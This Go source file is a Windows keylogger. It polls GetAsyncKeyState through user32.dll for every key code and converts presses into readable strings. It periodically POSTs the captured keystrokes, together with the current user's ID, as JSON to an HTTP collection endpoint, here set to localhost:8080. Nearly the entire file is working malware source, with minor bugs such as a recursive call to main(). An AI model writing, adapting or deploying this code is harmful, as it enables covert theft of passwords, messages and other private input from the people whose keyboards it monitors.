package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/user"
	"strconv"
	"syscall"
	"time"

	log2u "github.com/victormagalhaess/log2u"
)

const (
	PORT    = 8080
	ADDRESS = "localhost"
)

var log, _ = log2u.New(true, true, false, true, io.Writer(os.Stdout), "2006 Jan 02 15:04:05.000000000")

var (
	dll, _   = syscall.LoadDLL("user32.dll")
	proc, _  = dll.FindProc("GetAsyncKeyState")
	interval = flag.Int("interval", 50, "a time value elapses each frame in millisecond")
)

func ReplaceToStr(s *string, i int) {
	switch i {
	case 0x01:
		*s += ""
	case 0x02:
		*s += ""
	case 0x04:
		*s += ""
	case 0x08:
		*s += "_backspace_"
	case 0x09:
		*s += "_tab_"
	case 0x0d:
		*s += "_enter_"
	case 0x11:
		*s += "_controlD_"
	case 0x12:
		*s += "_altD_"
	case 0x14:
		*s += "_caps_"
	case 0x20:
		*s += " "
	case 0x25:
		*s += "_left_"
	case 0x26:
		*s += "_up_"
	case 0x27:
		*s += "_right_"
	case 0x28:
		*s += "_down_"
	case 0x2e:
		*s += "_del_"
	case 0x6a:
		*s += "* "
	case 0x6b:
		*s += "+ "
	case 0x6d:
		*s += "- "
	case 0x6e:
		*s += ". "
	case 0x6f:
		*s += "/ "
	case 0xa0:
		*s += "_lshiftD_"
	case 0xa1:
		*s += "_lshiftU_"
	case 0xba:
		*s += ": "
	case 0xbb:
		*s += "; "
	case 0xbc:
		*s += ", "
	case 0xbd:
		*s += "- "
	case 0xbe:
		*s += ". "
	case 0xbf:
		*s += "/ "
	case 0xc0:
		*s += "@ "
	case 0xdb:
		*s += "[ "
	case 0xdc:
		*s += "| "
	case 0xdd:
		*s += "] "
	case 0xde:
		*s += "^ "
	case 0xe2:
		*s += "back-slash "
	default:
		*s += fmt.Sprintf("%02x ", i)
	}
}

func GetKeyState(inputs []int) {
	// get current input
	for i := 1; i < 256; i++ {
		a, _, _ := proc.Call(uintptr(i))
		if a&0x8000 == 0 {
			continue
		}
		// num lock
		if i == 0xf4 || i == 0xf3 {
			continue
		}
		// mouse
		if i == 0x05 || i == 0x06 {
			continue
		}
		// shift
		if i == 0x10 {
			continue
		}
		inputs[i] = 1
	}
}

func Send(file string) {

	user, _ := user.Current()
	values := map[string]string{"id": user.Uid, "keys": file}
	json_data, err := json.Marshal(values)
	if err != nil {
		log.Errorf("%s", err)
	}
	url := "http://" + ADDRESS + ":" + strconv.Itoa(PORT) + "/api/v1/key"

	resp, err := http.Post(url, "application/json",
		bytes.NewBuffer(json_data))

	if err != nil {
		log.Errorf("%s", err)
	}
	var res map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&res)
}

func CheckPressed(s *string, inputs, prev []int) {
	// check all keys
	for i := 1; i < 256; i++ {
		// released
		if inputs[i] == 0 && prev[i] == 1 {
			switch i {
			case 0x01:
				*s += "" //left mouse
			case 0x02:
				*s += "" // right mouse
			case 0x04:
				*s += "" // mid mouse
			case 0x11:
				*s += "_ctrlU_"
			case 0x12:
				*s += "_altU_"
			case 0xa0:
				*s += "_lshiftU_"
			case 0xa1:
				*s += "_rshiftUp_"
			}
			continue
		} else if inputs[i] == 0 && prev[i] == 0 {
			// not pushed
			continue
		} else if inputs[i] == 1 && prev[i] == 1 {
			// now pressing
			continue
		}
		// character
		if 'A' <= i && i <= 'Z' {
			*s += fmt.Sprintf("%c", i)
			continue
		}
		// number
		if '0' <= i && i <= '9' {
			*s += fmt.Sprintf("%d", i-0x30)
			continue
		}
		ReplaceToStr(s, i)
	}
}

func LoggingLoop() {
	var start, end time.Time
	inputs := make([]int, 256)
	prev := make([]int, 256)
	s := ""
	var buffer bytes.Buffer
	var total_string = ""
	begin := time.Now()
	for {
		start = time.Now()
		s = ""
		GetKeyState(inputs)
		CheckPressed(&s, inputs, prev)
		if len(buffer.String()) <= 30 {
			buffer.WriteString(s)
		} else {
			buffer.WriteString("\n")
			push := buffer.String()
			buffer.Reset()
			log.Print(push)
			total_string += push
		}

		ending := time.Now()
		duration := ending.Sub(begin)
		if len(total_string) >= 30 || duration.Minutes() > 1 {
			if len(total_string) != 0 {
				Send(total_string)
			}
			main()
			begin = time.Now()
		}
		prev = inputs
		inputs = make([]int, 256)
		end = time.Now()
		remain := (time.Millisecond * (time.Duration)(*interval)) - end.Sub(start)
		if remain > 0 {
			time.Sleep(remain)
		}
	}
}

func main() {

	defer dll.Release()

	flag.Parse()

	LoggingLoop()

}
